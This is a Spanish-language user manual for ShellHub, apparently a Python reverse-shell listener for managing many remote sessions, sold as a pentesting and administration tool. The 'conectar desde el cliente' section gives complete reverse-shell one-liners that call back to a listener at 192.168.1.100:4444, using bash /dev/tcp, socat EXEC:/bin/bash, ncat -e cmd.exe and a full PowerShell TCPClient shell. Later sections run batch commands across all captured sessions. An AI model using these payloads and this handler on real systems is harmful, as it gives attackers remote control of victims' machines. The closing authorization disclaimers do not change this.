# ShellHub v1.0 - Manual de Usuario
## Índice

- Descripción General

- Características Principales

- Instalación y Configuración
 
- Uso Básico

- Comandos Disponibles

- Ejemplos Prácticos

- Solución de Problemas

## Descripción General

ShellHub es una herramienta avanzada de administración remota multi-OS diseñada para pentesting y administración de sistemas. Soporta conexiones simultáneas, detección automática de sistemas operativos y shells interactivos.

## Características Principales

- Multi-OS Support: Detección automática de Windows(beta), Linux.

- TLS/SSL Support: Comunicaciones encriptadas con certificados autofirmados.

- Sesiones Interactivas: TTY completo con soporte para bash, PowerShell, cmd.

- Gestión Avanzada: Múltiples sesiones simultáneas.

- Comandos en Lote: Ejecución de comandos en todas las sesiones activas

- Loggeo: Registro detallado de todas las actividades

## Instalación y Configuración

### Prerrequisitos
```bash
Python 3.8 o superior
python3 --version

# OpenSSL (opcional, para TLS)
- openssl version
```
### Instalación Rápida
```bash
- Clonar el repositorio
wget https://raw.githubusercontent.com/tuusuario/shellhub/main/shellhub.py

- Dar permisos de ejecución (opcional)
chmod +x shellhub.py

- Ejecutar
python3 shellhub.py
```
## Configuración del Entorno

El script crea automáticamente los siguientes directorios:

*./certs/* - Certificados TLS/SSL

*./sessions/* - Logs de sesiones

*./logs/* - Logs de la aplicación

## Uso Básico
- 1. Iniciar ShellHub

```bash
python3 shellhub.py
```
Verás el banner de ShellHub y el prompt interactivo:

```bash
ShellHub >> 
```
- 2. Crear un Certificado TLS (Opcional)
```bash
ShellHub >> cert create mi-certificado
[+] Certificado creado: ./certs/mi-certificado.crt, ./certs/mi-certificado.key
```
- 3. Iniciar un Listener
#### Sin TLS:
```bash
ShellHub >> listener add 0.0.0.0 4444
[+] Listener 1 iniciado en 0.0.0.0:4444
```
#### Con TLS:
```bash
ShellHub >> listener add 0.0.0.0 4444 TLS mi-certificado
[+] Listener 1 iniciado en 0.0.0.0:4444 (TLS: True)
```
- 4. Conectar desde el Cliente

#### Linux/Unix - Sin TLS:
```bash
Método 1: Netcat básico
nc 192.168.1.100 4444
```
Método 2: Socat (recomendado para shell interactiva)
```bash
socat TCP:192.168.1.100:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```
Método 3: Bash nativo
```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```
#### Linux/Unix - Con TLS:
```bash
# Usando OpenSSL
openssl s_client -connect 192.168.1.100:4444

# Usando Socat con TLS
socat OPENSSL:192.168.1.100:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```
#### Windows - Sin TLS:
```powershell
PowerShell
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# CMD (usando ncat si está disponible)
ncat 192.168.1.100 4444 -e cmd.exe
```
#### Windows - Con TLS:
> - PowerShell con TLS (requiere ajustes específicos)
> - Recomendado: usar versión sin TLS para Windows por simplicidad

## Comandos Disponibles
### Gestión de Listeners
| Comando        | Descripción            | Ejemplo                 |
|----------------|------------------------|--------------------------|
| listener add   | Crear listener         | listener add 0.0.0.0 80 |
| listener stop  | Detener listener       | listener stop 1         |
| sessions       | Listar sesiones        | sessions                |
### Gestión de Certificados
| Comando            | Descripción         | Ejemplo              |
| ------------------ | ------------------- | -------------------- |
| `cert create NAME` | Crear certificado   | `cert create prueba` |
| `cert list`        | Listar certificados | `cert list`          |
### Gestión de Sesiones
| Comando           | Descripción            | Ejemplo           |
| ----------------- | ---------------------- | ----------------- |
| `sessions`        | Listar sesiones        | `sessions`        |
| `info ID`         | Info detallada         | `info 1`          |
| `use ID`          | Sesión interactiva     | `use 1`           |
| `exec ID CMD`     | Ejecutar comando       | `exec 1 whoami`   |
| `runall CMD`      | Ejecutar en todas      | `runall hostname` |
| `kill ID`         | Cerrar sesión          | `kill 1`          |
| `rename ID ALIAS` | Renombrar sesión       | `rename 1 web01`  |
| `detect ID`       | Forzar detección de OS | `detect 1`        |
### Utilidades
| Comando       | Descripción       | Ejemplo |
|---------------|-------------------|---------|
| `help`        | Mostrar ayuda     | help    |
| `clear`       | Limpiar pantalla  | clear   |
| `exit / quit` | Salir de ShellHub | exit    |
##Ejemplos Prácticos
####Escenario 1: Administración Básica de Servidores
```bash
# 1. Iniciar listener
ShellHub >> listener add 0.0.0.0 4444

# 2. Desde los servidores objetivo, conectar con:
# socat TCP:192.168.1.100:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# 3. Ver sesiones activas
ShellHub >> sessions

# 4. Ejecutar comando en todos los servidores
ShellHub >> runall "uname -a && whoami"

# 5. Acceder a sesión específica
ShellHub >> use 1
```
#### Escenario 2: Pentesting con Comunicación Segura
```bash
# 1. Crear certificado TLS
ShellHub >> cert create pentest-cert

# 2. Iniciar listener seguro
ShellHub >> listener add 0.0.0.0 4444 TLS pentest-cert

# 3. Desde el objetivo, conectar con:
# openssl s_client -connect 192.168.1.100:4444

# 4. Trabajar de forma segura
ShellHub >> sessions
ShellHub >> use 1
```
#### Escenario 3: Monitoreo y Auditoría
```bash
# 1. Recolectar información de todos los sistemas
ShellHub >> runall "cat /etc/os-release 2>/dev/null || systeminfo 2>/dev/null || ver 2>/dev/null"

# 2. Verificar usuarios conectados
ShellHub >> runall "who 2>/dev/null || query user 2>/dev/null"

# 3. Revisar procesos
ShellHub >> runall "ps aux 2>/dev/null || tasklist 2>/dev/null"

# 4. Monitorear en tiempo real
ShellHub >> sessions
```
## Solución de Problemas
> - *Error:* "No se pudo iniciar listener"

### Causas posibles:
- Puerto ya en uso

- Permisos insuficientes

- Firewall bloqueando

#### Soluciones:
```bash
# Verificar puertos en uso
netstat -tulpn | grep 4444

# Usar puerto diferente
ShellHub >> listener add 0.0.0.0 4445

# Ejecutar con permisos de administrador si es necesario
sudo python3 shellhub.py
```
> - *Error:* "Certificado no válido"

#### Solución:
```bash
# Recrear certificado
ShellHub >> cert create nuevo-certificado

# Verificar que los archivos existen
ls -la ./certs/
```
> - *Error:* Timeout en Comandos

### Causas:
- Conexión lenta

- Firewall intermedio

- Sistema remoto ocupado

#### Soluciones:

- Usar detect ID para verificar conectividad

- Probar con comandos simples primero: exec 1 echo "test"

- Verificar logs en ./logs/shellhub.log

> - Sesión No Responde

### Procedimiento de recuperación:
```bash
# 1. Verificar estado
ShellHub >> sessions

# 2. Forzar detección de OS
ShellHub >> detect 1

# 3. Si no responde, cerrar y reconectar
ShellHub >> kill 1

# 4. Desde el cliente, reconectar
```
## Interpretación del Listado de Sesiones

Cuando ejecutas *sessions*, verás:
```text
ID   Alias              Dirección             OS       Shell        RX/TX        Listener   Estado
1    session-1          192.168.1.10:54322    linux    bash         1024/2048    1          ACTIVA
2    session-2          10.0.0.5:38291        windows  powershell   512/1024     1          ACTIVA
```
Campos:

- ID: Identificador único de sesión

- Alias: Nombre asignado (puedes cambiarlo con rename)

- Dirección: IP:Puerto del cliente

- OS: Sistema operativo detectado

- Shell: Tipo de shell (bash, powershell, cmd, etc.)

- RX/TX: Bytes recibidos/enviados

- Listener: ID del listener que aceptó la conexión

- Estado: ACTIVA (verde) o MUERTA (rojo)

# Advertencias

# ⚠️ Solo usar en entornos autorizados

# ⚠️ No exponer listeners a internet sin protección

# ⚠️ Mantener el software actualizado

# ⚠️ Revisar logs periódicamente para detectar actividades sospechosas

## Logging Completo

#### Logs de aplicación: ./logs/shellhub.log

#### Logs por sesión: ./sessions/session_ID_IP_PORT.log

#### Timestamps UTC para correlación de eventos

## Comandos adaptados automáticamente según el OS:

- Linux: ls, ps, whoami

- Windows: dir, tasklist, whoami

## Contribuciones :D

¿Encontraste un bug o tienes una mejora?

- Reporta issues en GitHub

- Sugiere nuevas características


# 📄 Licencia

> ShellHub v1.0 - Tool creada por b4d1t para fines educativos y de administración legítima.

> ⚠️ AVISO LEGAL: Solo usar en sistemas donde tengas autorización explícita.

